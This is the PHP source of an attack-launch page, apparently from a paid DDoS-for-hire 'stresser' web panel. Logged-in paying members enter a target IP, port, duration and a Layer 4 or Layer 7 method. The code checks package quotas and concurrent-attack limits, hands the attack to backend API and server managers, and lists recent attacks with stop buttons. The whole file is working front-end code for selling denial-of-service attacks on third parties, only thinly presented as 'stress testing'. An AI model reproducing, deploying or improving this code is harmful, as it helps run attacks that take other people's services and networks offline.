﻿<?php
ob_start(); 
require_once 'engine/config.php';
require_once 'engine/init.php';

if (!($user -> LoggedIn()))
{
	header('Location: login.php');
	die();
}
if ($user -> IsBanned($odb))
{
	header('Location: logout.php');
	die();
}
if (!($user->hasMembership($odb)))
{
	header('location: packages.php');
	die();
}
$SQLGetTerms = $odb -> prepare("SELECT tos FROM `settings` WHERE `id` = 1 LIMIT 1");
$SQLGetTerms -> execute();
$getInfo = $SQLGetTerms -> fetch(PDO::FETCH_ASSOC);
$tos = $getInfo['tos'];

$GetMaxTime = $odb -> prepare("SELECT `maxboot` FROM `users` WHERE `ID` = :id AND `username` = :username");
$GetMaxTime -> execute(array(':id' => $_SESSION['ID'], ':username' => $_SESSION['username']));
$maxBoot = $GetMaxTime -> fetchColumn(0);

$disableAttack = '';
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">

	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
	<meta name="description" content="" />
	<meta name="author" content="Woopza.com" />

	<title><?php echo $web_title;?>Stresser HUB</title>

	<link rel="stylesheet" href="http://fonts.googleapis.com/css?family=Arimo:400,700,400italic">
	<link rel="stylesheet" href="assets/css/fonts/linecons/css/linecons.css">
	<link rel="stylesheet" href="assets/css/fonts/fontawesome/css/font-awesome.min.css">
	<link rel="stylesheet" href="assets/css/bootstrap.css">
	<link rel="stylesheet" href="assets/css/xenon-core.css">
	<link rel="stylesheet" href="assets/css/xenon-forms.css">
	<link rel="stylesheet" href="assets/css/xenon-components.css">
	<link rel="stylesheet" href="assets/css/xenon-skins.css">
	<link rel="stylesheet" href="assets/css/custom.css">

	<script src="assets/js/jquery-1.11.1.min.js"></script>

	<!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
	<!--[if lt IE 9]>
		<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
		<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
	<![endif]-->


</head>
<div class="page-loading-overlay">
	<div class="loader-2"></div>
</div>
<body class="page-body">
	
	<div class="page-container">
			
		<?php include 'templates/sidebar.php'; ?>
	
		<div class="main-content">
					
			<?php include 'templates/navbar.php'; ?>
			
			<div class="row">
				<div class="col-sm-12	">
					<?php
					if(isset($_POST['stressBtn']))
					{
						$SQLGetUser = $odb -> prepare("SELECT `package` FROM `users` WHERE `id` = :id LIMIT 1");
						$SQLGetUser -> execute(array(':id' => $_SESSION['ID']));
						$getInfo = $SQLGetUser -> fetch(PDO::FETCH_ASSOC);
						$package = $getInfo['package'];
						//$maxboot = $getInfo['maxboot'];
						$SQLGetMSInfo = $odb -> prepare("SELECT `methods`, `concurrents` FROM `packages` WHERE `id` = :id LIMIT 1");
						$SQLGetMSInfo -> execute(array(':id' => $package));
						$packageInfo = $SQLGetMSInfo -> fetch(PDO::FETCH_ASSOC);
						$concurrents = $packageInfo['concurrents'];
						$methodz = json_decode($packageInfo['methods'], true);
						$errors = array();
						$target = $_POST['target'];
						$port = $_POST['port'];
						$time = $_POST['time'];
						$method = $_POST['method'];
						
						if (empty($target) || empty($port) || empty($time) || empty($method))
						{
							$errors[] = 'Please fill in all fields.';
						}
						$checkBlacklist = $odb->prepare("SELECT COUNT(*) FROM `blacklist` WHERE `ip` = :ip");
						$checkBlacklist -> execute(array(':ip' => $target));
						$IsBlacklisted = $checkBlacklist->fetchColumn(0);
						if(!($IsBlacklisted == 0))
						{
							$errors[] = 'You can not attack this ip address.';
						}
						if (!in_array($method, $methodz)) 
						{
							$errors[] = 'This attack method is not available for your membership.';
						}
						if ($time > $maxBoot)
						{
							$errors[] = 'You have exceeded your maximum attack time. Please try again!';
						}
						if ($package == 0)
						{
							$RunningBoots = $odb->prepare("select count(*) from `attacklogs` where `user` = :user and `time` + date > UNIX_TIMESTAMP()");
							$RunningBoots->execute(array(":user" => $_SESSION['username']));
							$countRB = intval($RunningBoots->fetchColumn(0));
							if($countRB != 0)
							{
								$errors[] = 'You have reached your concurrent limit. Please wait until your current attack(s) are finished before attacking again!';
							}
						} else {
							$RunningBoots = $odb->prepare("select count(*) from `attacklogs` where `user` = :user and `time` + date > UNIX_TIMESTAMP()");
							$RunningBoots->execute(array(":user" => $_SESSION['username']));
							$countRB = intval($RunningBoots->fetchColumn(0));
							if($countRB > $concurrents)
							{
								$errors[] = 'You have reached your concurrent limit. Please wait until your current attack(s) are finished before attacking again!';
							}
						}
						
						if(empty($errors)) {
							$apimng -> prepareAttack($odb, $target, $port, $time, $method);
							$servermng -> prepareAttack($odb, $target, $port, $time, $method);
							echo '<div class="alert alert-success"><a class="close" data-dismiss="alert" href="#" aria-hidden="true">×</a><strong>Success!</strong><br> You have started the attack successfully!</div>';
						} else {
							echo '<div class="alert alert-danger"><a class="close" data-dismiss="alert" href="#" aria-hidden="true">×</a><strong>Error!</strong><br />';
							foreach($errors as $error)
							{
								echo '- '.$error.'<br />';
							}
							echo '</div>';
						}
					}
					if(isset($_GET['stopAttack']))
					{
						$stopID = $_GET['stopAttack'];
						if (!isset($_GET['stopAttack']) || !is_numeric($_GET['stopAttack'])) {
							header('location: hub.php');
							die();
						}
						$getInfo = $odb->prepare("select * from `attacklogs` where `id` = :id");
						$getInfo->execute(array(":id" => $stopID));
						$Info = $getInfo->fetch(PDO::FETCH_ASSOC);
						if($Info['user'] != $_SESSION['username'])
						{
							header('location: hub.php');
							die;
						}
						$type = $Info['type'];
						$targetip = $Info['ip'];
						$targetport = $Info['port'];
						$targettime = $Info['time'];
						$method = $Info['method'];
						if ($type == 'server')
						{
							$serverid = $Info['sid'];
							if ($servermng -> stopAttack($odb, $targetip, $serverid, $method))
							{
								$SQL = $odb -> prepare("UPDATE `attacklogs` SET `time` = 0 WHERE `id` = :id");
								$SQL -> execute(array(':id' => $stopID));
								echo '<div class="alert alert-success"><a class="close" data-dismiss="alert" href="#" aria-hidden="true">×</a><strong>Success!</strong><br> The command to stop attack has been executed!</div>';
							} else {
								echo '<div class="alert alert-danger"><a class="close" data-dismiss="alert" href="#" aria-hidden="true">×</a><strong>Error!</strong> Seems like the attack method / server does not support this function. </div>';
							}
						} else {
							$stopurl = $Info['stopurl'];
							if ($apimng -> stopAttack($odb, $targetip, $targetport, $targettime, $stopurl))
							{
								$SQL = $odb -> prepare("UPDATE `attacklogs` SET `time` = 0 WHERE `id` = :id");
								$SQL -> execute(array(':id' => $stopID));
								echo '<div class="alert alert-success"><a class="close" data-dismiss="alert" href="#" aria-hidden="true">×</a><strong>Success!</strong><br> The command to stop attack has been executed!</div>';
							} else {
								echo '<div class="alert alert-danger"><a class="close" data-dismiss="alert" href="#" aria-hidden="true">×</a><strong>Error!</strong> Seems like the attack method / server does not support this function. </div>';
							}
						}
					}
					$CheckAPIs = "SELECT count(*) FROM `apis`"; 
					$resultAPI = $result = $odb->prepare($CheckAPIs); 
					$resultAPI->execute(); 
					$countAPIs = $resultAPI->fetchColumn(); 
					$CheckServers = "SELECT count(*) FROM `servers` WHERE NOT `response` = :response"; 
					$result = $odb->prepare($CheckServers); 
					$result->execute(array(':response' => 'offline')); 
					$countServers = $result->fetchColumn(); 
					if ($countServers == 0 && $countAPIs == 0)
					{
						$disableAttack = 'disabled="disabled"';
						echo '<div class="alert alert-warning"><a class="close" data-dismiss="alert" href="#" aria-hidden="true">×</a><strong>Busy!</strong> All servers are busy at the moment, please try again soon! </div>';
					}
				?>
				</div>
				<div class="col-sm-12">
					<div class="panel panel-default">
						<div class="panel-heading">
							<h3 class="panel-title">New Stress Test</h3>
						</div>
						<div class="panel-body">
			
							<form role="form" class="form-horizontal" method="post">
			
								<div class="form-group">
                                    <label class="col-sm-2 control-label">Target Host / IP</label>
                                    <div class="col-sm-7">
                                      <input type="text" name="target" class="form-control form-control-flat" placeholder="127.0.0.1">
                                    </div>
                                  </div>
								  
								  <div class="form-group-separator"></div>
								  
								  <div class="form-group">
                                    <label class="col-sm-2 control-label">Target Port</label>
                                    <div class="col-sm-7">
                                      <input type="text" name="port" class="form-control form-control-flat" placeholder="80">
                                    </div>
                                  </div>
								  
								  <div class="form-group-separator"></div>
								  
								  <div class="form-group">
                                    <label class="col-sm-2 control-label">Time (seconds)</label>
                                    <div class="col-sm-7">
                                      <input type="text" name="time" class="form-control form-control-flat" placeholder="60" maxlength="<?php echo $maxBoot; ?>">
                                    </div>
                                  </div>
								  
								  <div class="form-group-separator"></div>
								  
								  <div class="form-group">
									<label class="col-sm-2 control-label">Method</label>
									
									<script type="text/javascript">
										jQuery(document).ready(function($)
										{
											$("#methodselect-1").select2({
												placeholder: 'Select your method...',
												allowClear: true
											}).on('select2-open', function()
											{
												// Adding Custom Scrollbar
												$(this).data('select2').results.addClass('overflow-hidden').perfectScrollbar();
											});
											
										});
									</script>
									<div class="col-sm-7">
									<select class="form-control" id="methodselect-1" name="method">
										<option></option>
										<optgroup label="Layer 4">
											<?php 
												$GetMethods = $odb -> prepare("SELECT * FROM `methods` WHERE `group` = :group");
												$GetMethods -> execute(array(':group' => 'layer4'));
												while($methods = $GetMethods -> fetch(PDO::FETCH_ASSOC))
												{
													//$mi = $methods['id'];
													$mn = $methods['method'];
													echo '<option value="'.$mn.'">'.$mn.'</option>';
												}
											?>
										</optgroup>
										<optgroup label="Layer 7">
											<?php 
												$GetMethods = $odb -> prepare("SELECT * FROM `methods` WHERE `group` = :group");
												$GetMethods -> execute(array(':group' => 'layer7'));
												while($methods = $GetMethods -> fetch(PDO::FETCH_ASSOC))
												{
													//$mi = $methods['id'];
													$mn = $methods['method'];
													echo '<option value="'.$mn.'">'.$mn.'</option>';
												}
											?>
										</optgroup>
									</select>
									</div>
										
									</div>
								  
								  <div class="form-group-separator"></div>
								
									<div class="form-group">
										<div class="col-lg-9 col-lg-offset-2">
											<a <?php echo $disableAttack; ?> href="javascript:;" onclick="jQuery('#stress-confirm').modal('show', {backdrop: 'fade'});" class="btn btn-secondary btn-single btn-sm">Start Attack</a>
										</div>
									</div>
									<div class="modal fade" id="stress-confirm">
										<div class="modal-dialog">
											<div class="modal-content">
												
												<div class="modal-header">
													<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
													<h4 class="modal-title">Are you sure ?</h4>
												</div>
												
												<div class="modal-body">
													By starting this attack, you agree the following terms:<br><br>
													<?php echo $tos; ?>
												</div>
												
												<div class="modal-footer">
													<button type="button" class="btn btn-white" data-dismiss="modal">Close</button>
													<button type="submit" name="stressBtn" class="btn btn-info">I Agree</button>
												</div>
											</div>
										</div>
									</div>
							</form>
			
						</div>
					</div>
				</div>
				
				<div class="col-sm-12">
					<div class="panel panel-default">
						<div class="panel-heading">
							<h3 class="panel-title">Last 5 Attacks</h3>
						</div>
						<div class="panel-body">
														
							<table class="table table-striped table-bordered" cellspacing="0" width="200%">
								<thead>
									<tr>
										<th>Target / Port</th>
										<th>Time</th>
										<th>Status</th>
										<th>Manage</th>
									</tr>
								</thead>
						
								<tbody>
								<?php
									$GetAttacks = $odb -> prepare("SELECT * FROM `attacklogs` WHERE `user` = :user ORDER BY `id` DESC LIMIT 5");
									$GetAttacks -> execute(array(':user' => $_SESSION['username']));
									while ($getInfo = $GetAttacks -> fetch(PDO::FETCH_ASSOC))
									{
										$id = $getInfo['id'];
										$target = $getInfo['ip'];
										$port = $getInfo['port'];
										$time = $getInfo['time'];
										$type = $getInfo['type'];
										$date = $getInfo['date'];
										$currents = new DateTime();
										$timestamp = $currents->getTimestamp();
										
										if ($date + $time > $timestamp)
										{
											$status = '<span class="label label-warning label-mini">Running</span>';
										} else {
											$status = '<span class="label label-success label-mini">Done!</span>';
											$disabled = 'disabled="disabled"';
										}
						
										echo '
										<tr>
											<td>
												<a href="#">
													'.$target.':'.$port.'
												</a>
											</td>
											<td>'.$time.' Seconds </td>
											<td>'.$status.'</td>
											<td><a href="hub.php?stopAttack='.$id.'"><button class="btn btn-danger btn-xs" type="button" '.$disabled.'>Stop!</button></a></td>
										</tr>';
									}
								?>
								</tbody>
							</table>
							
						</div>
					</div>
				</div>
				
				<div class="clearfix"></div>
				
			</div>
			
			<?php include 'templates/footer.php'; ?>
		</div>
		
	</div>
	

	<!-- Imported styles on this page -->
	<link rel="stylesheet" href="assets/css/fonts/meteocons/css/meteocons.css">
	<link rel="stylesheet" href="assets/js/select2/select2.css">
	<link rel="stylesheet" href="assets/js/select2/select2-bootstrap.css">
	<link rel="stylesheet" href="assets/js/datatables/dataTables.bootstrap.css">

	<!-- Bottom Scripts -->
	<script src="assets/js/bootstrap.min.js"></script>
	<script src="assets/js/TweenMax.min.js"></script>
	<script src="assets/js/resizeable.js"></script>
	<script src="assets/js/joinable.js"></script>
	<script src="assets/js/xenon-api.js"></script>
	<script src="assets/js/xenon-toggles.js"></script>
	
	<script src="assets/js/select2/select2.min.js"></script>
	<script src="assets/js/datatables/js/jquery.dataTables.min.js"></script>
	
	<script src="assets/js/datatables/dataTables.bootstrap.js"></script>
	<script src="assets/js/datatables/yadcf/jquery.dataTables.yadcf.js"></script>
	<script src="assets/js/datatables/tabletools/dataTables.tableTools.min.js"></script>


	<!-- Imported scripts on this page -->
	<script src="assets/js/jvectormap/jquery-jvectormap-1.2.2.min.js"></script>
	<script src="assets/js/jvectormap/regions/jquery-jvectormap-world-mill-en.js"></script>
	<script src="assets/js/xenon-widgets.js"></script>


	<!-- JavaScripts initializations and stuff -->
	<script src="assets/js/xenon-custom.js"></script>

</body>
</html>